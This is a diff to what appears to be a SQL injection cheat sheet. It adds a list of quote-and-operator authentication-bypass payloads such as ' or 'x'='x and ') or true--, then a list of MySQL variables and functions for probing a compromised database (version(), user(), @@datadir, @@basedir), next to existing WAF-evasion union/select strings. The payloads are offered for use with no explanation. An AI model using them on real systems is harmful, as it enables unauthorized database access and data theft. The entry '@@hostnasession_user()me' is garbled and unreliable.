@@ -148,6 +148,37 @@ https://pentest-tools.com/website-vulnerability-scanning/sql-injection-scanner-o
 ;%60
 ;%60
 ;%00
+-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
 ```
 >next order by
 ```
@@ -236,7 +267,28 @@ uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
 union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
 ```
+>next
+>print system
+```
 
+@@ft_boolean_syntax
+version()
+current_database()
+system_user()
+user()
+database()
+now()
+@@hostnasession_user()me
+@@port
+@@tmpdir
+@@slave_load_tmpdir
+@@datadir
+@@basedir
+@@log
+@@log_bin
+@@log_error
+@@GLOBAL.have_symlink
+```
 
 
 
